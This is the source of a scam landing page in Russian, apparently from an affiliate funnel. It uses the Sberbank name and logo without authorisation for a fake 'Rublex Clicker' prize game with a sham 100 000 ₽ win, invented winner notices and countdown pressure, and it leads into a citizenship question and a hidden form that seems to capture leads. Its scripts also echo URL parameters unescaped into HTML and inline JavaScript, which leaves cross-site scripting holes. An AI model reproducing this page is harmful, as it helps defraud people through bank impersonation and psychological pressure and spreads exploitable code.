<?php
if (!isset($rawClick) && !isset($click)) {
  die();
}
?>

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>СберБанк</title>
    <link
      rel="shortcut icon"
      href="./assets/img/icons/logo_rublex.svg"
      type="image/x-icon"
    />
    <link rel="stylesheet" href="./assets/css/styles.css" />

    <script src="form/js/libs/intlTelInput.js"></script>
    
    <script>
    let scriptLoadings = false;
  // Функция для получения значения параметра из URL
  function getUrlParam(name) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
  }

  // Проверяем наличие параметров
  const bgeValue = getUrlParam("bge");
  const crmSource = getUrlParam("crm_source");

  if (bgeValue) { 
    // Если есть только bgeValue – подключаем скрипты для bge
    let inlineScript = document.createElement("script");
    inlineScript.innerHTML = `
      window.bgdataLayer = window.bgdataLayer || [];
      function bge() { bgdataLayer.push(arguments); }
      bge('init', '${bgeValue}');
    `;
    document.head.appendChild(inlineScript);

    // Подключаем второй скрипт для bge
    let asyncScript = document.createElement("script");
    asyncScript.src = "https://api.imotech.video/ad/events.js?pixel_id=" + bgeValue;
    document.head.appendChild(asyncScript);
    
    // Ожидаем загрузки всех скриптов, чтобы продолжить выполнение (если нужно)
    asyncScript.onload = function() {
      // Здесь можно добавить код, который должен выполняться после подгрузки всех скриптов
      console.log('Все скрипты для BGE загружены!');
    };

  } else if (!crmSource) { 
    // Если НЕТ ни bgeValue, ни crmSource – подключаем альтернативные скрипты
    let trackScript = document.createElement("script");
    trackScript.type = "application/javascript";
    trackScript.src = "track.js?v=21238";
    document.head.appendChild(trackScript);

    trackScript.onload = function() {
      // Здесь можно добавить код, который должен выполняться после подгрузки track.js
      console.log('track.js загружен!');
    };

    let inlineScript = document.createElement("script");
    inlineScript.innerHTML = `
      function getCookie(name) {
        let matches = document.cookie.match(
          new RegExp("(?:^|; )" + name.replace(/([.$?*|{}()[]\\/+^])/g, "\\$1") + "=([^;]*)")
        );
        return matches ? decodeURIComponent(matches[1]) : undefined;
      }

      const subid_1 = getCookie("_subid");

      var offerData = {
        subid: subid_1,
        buyer: "{buyer}",
        crm_campaign: "{crm_campaign}",
        thank_you_page: "{thank_you_page}",
        landing_name: "offer_id_" + "{offer_id}",
        app_key: "{app_key}",
        bge: "{bge}",
        ts_id: "{ts_id}",
        info: "{info}"
      };
    `;
    document.head.appendChild(inlineScript);

    inlineScript.onload = function() {
      // Здесь можно добавить код, который должен выполняться после подгрузки inlineScript
      console.log('Inline script для альтернативы загружен!');
    };

    let parseScript = document.createElement("script");
    parseScript.type = "application/javascript";
    parseScript.src = "parse_url.js?v=19";
    document.head.appendChild(parseScript);
    
    scriptLoadings = true;

    parseScript.onload = function() {
      // Здесь можно добавить код, который должен выполняться после подгрузки parse_url.js
      console.log('parse_url.js загружен!');
    };
    
    window.removeEventListener("beforeunload", trackClose);
  }
</script>



    <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
        return v ? v[2] : null;
      }

      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie =
          name + "=" + value + ";path=/;expires=" + d.toGMTString();
      }

      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{subid}".match("{")) {
          return "{subid}";
        }
        var clientSubid =
          '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (!clientSubid.match(">")) {
          return clientSubid;
        }
        if (params.get("_subid")) {
          return params.get("_subid");
        }
        if (params.get("subid")) {
          return params.get("subid");
        }
        if (getCookie("subid")) {
          return getCookie("subid");
        }
      }

      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{token}".match("{")) {
          return "{token}";
        }
        var clientToken =
          '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (!clientToken.match(">")) {
          return clientToken;
        }
        if (params.get("_token")) {
          return params.get("_token");
        }
        if (params.get("token")) {
          return params.get("token");
        }
        if (getCookie("token")) {
          return getCookie("token");
        }
        return null;
      }

      function getPixel() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{pixel}".match("{")) {
          return "{pixel}";
        }
        if (params.get("pixel")) {
          return params.get("pixel");
        }

        if (getCookie("pixel")) {
          return getCookie("pixel");
        }

        return null;
      }

      if (typeof URLSearchParams === "function") {
        document.addEventListener("DOMContentLoaded", function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();
          var pixel = getPixel();

          params.set("_token", token);
          setCookie("pixel", pixel);
          setCookie("token", token);
          setCookie("subid", subid);
        });
      }
    </script>
    
  </head>
  <body>
    <header class="header">
      <img src="./assets/img/icons/logo.svg" alt="СберБанк" />
      <div class="header__logo-wrapper">
        <img src="./assets/img/icons/logo_rublex.svg" alt="Rublex" />
        <div class="header__text-wrapper">
          <span class="header__text">Rublex</span>
          <span class="header__text">Clicker</span>
        </div>
      </div>
    </header>
    <main class="main">
      <div class="main__heading">
        <h2>
          Секретный сундук от Rublex и Сбер Инвестиций! Открой и забери деньги!

          <link rel="preconnect" href="https://fonts.googleapis.com" />
          <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
          <link
            href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100..900;1,100..900&display=swap"
            rel="stylesheet"
          />
        </h2>
      </div>
      <div class="main__chests">
        <img src="./assets/img/chests_mob.svg" alt="Chests" class="chests" id="chests"/>
      </div>
      <div class="main__buttons">
        <div class="button__backdrop">
          <button type="button" id="chest-button">Открыть сундук</button>
        </div>
        <div class="main__notifications" id="notification">
  <span class="accent">Киселёв В.</span> только что получил
  <span class="accent">10 000₽!</span>
        </div>
        </div>
      </div>
    </main>
    <footer class="footer">
        <img src="./assets/img/icons/logo.svg" alt="СберБанк">
        <div class="footer__text-wrapper">
            <span class="footer__text top">Сбер Инвестиции – официальный партнер</span>
            <span class="footer__text">Все выигрыши выплачиваются 
в соответствии с правилами сервиса</span>
        </div>
    </footer>
    <div id="modal" class="modal hidden">
        <div class="modal-content">
            <span class="modal-congrats">Поздравляем, вы выиграли <span class="accent">100 000 ₽</span></span>
        </div>
      <div class="modal-content">
        <div class="modal-info-wrapper">
          <div class="modal-info">
              <span class="modal-text top">⚠ Осталось времени 
  на активацию выигрыша:</span>
              <span class="modal-text">3 человека в очереди готовы забрать ваш приз!</span>
              <span class="modal-text bottom">Остался последний шаг
  – активируйте выигрыш сейчас!</span>
          </div>
          <div class="modal-timer-wrapper">
            <div class="modal-timer-overlay">
                <div class="modal-timer">
                    <span class="timer" id="countdown">00 : 14 : 59</span>
                </div>
            </div>
            <div class="modal-alert top">
            <span class="modal-text alert">Внимание!</span>
            <p class="modal-text">Если вы не подтвердите выигрыш, он будет передан другому пользователю!</p>
        </div>
          </div>
        </div>
        <div class="button__backdrop" id="quiz-button-wrap">
          <button type="button" id="quiz-button">Забрать выигрыш</button>
        </div>
        <div class="modal-question hidden">
          <span class="question">Вы являетесь гражданином Российской Федерации <br>
(есть ли у Вас Российское гражданство)?</span>
        <div class="answer-buttons">
          <div class="answer-btn" id="btn-no">Нет</div>
          <div class="answer-btn" id="btn-yes">Да</div>
        </div> 
        </div>
        <div class="modal-alert bottom">
            <span class="modal-text alert">Внимание!</span>
            <p class="modal-text">Если вы не подтвердите выигрыш, он будет передан другому пользователю!</p>
        </div>
        <form class="form _main-form contact-form hidden" id="main-form" method="post">
             <input type="hidden" id="utm_medium" value='<?= $_GET['utm_medium'] ?>'>
                        <input type="hidden" id="campaing_id" value='<?= $_GET['campaing_id'] ?>'>
                        <input type="hidden" id="slug" value='<?= $_GET['slug'] ?>'>
                        <input type="hidden" id="bge" value='<?= $_GET['bge'] ?>'>
                        <input type="hidden" id="source" value='<?= $_GET['source'] ?>'>
        </form>
      </div>
    </div>
    <script src="./assets/js/main.js"></script>
     <script src="loadAssets.js?v=321"></script>

    <script>
      window.onload = function() {
        var err = localStorage.getItem('unsuitable');
        var thx = localStorage.getItem('thanks');
        if (err && err === "false") {
          const fileErr = 'err.html'
          window.location.href = `${fileErr}${window.location.search}`;
        }
        else if (thx && thx === "true") {
          const fileThx = 'thanks-page.php'
          window.location.href = `${fileThx}${window.location.search}`;
        }
      }
      
      window.onpageshow = function() {
        var err = localStorage.getItem('unsuitable');
        var thx = localStorage.getItem('thanks');
        if (err && err === "false") {
          const fileErr = 'err.html'
          window.location.href = `${fileErr}${window.location.search}`;
        }
        else if (thx && thx === "true") {
          const fileThx = 'thanks-page.php'
          window.location.href = `${fileThx}${window.location.search}`;
        }
      }
    </script>

    <script type="application/javascript">
      function getSubId() {
        if (!"{subid}".match("{")) {
          localStorage.setItem("subid", "{subid}");
          return "{subid}";
        }
      }
      getSubId();
    </script>
  </body>
</html>
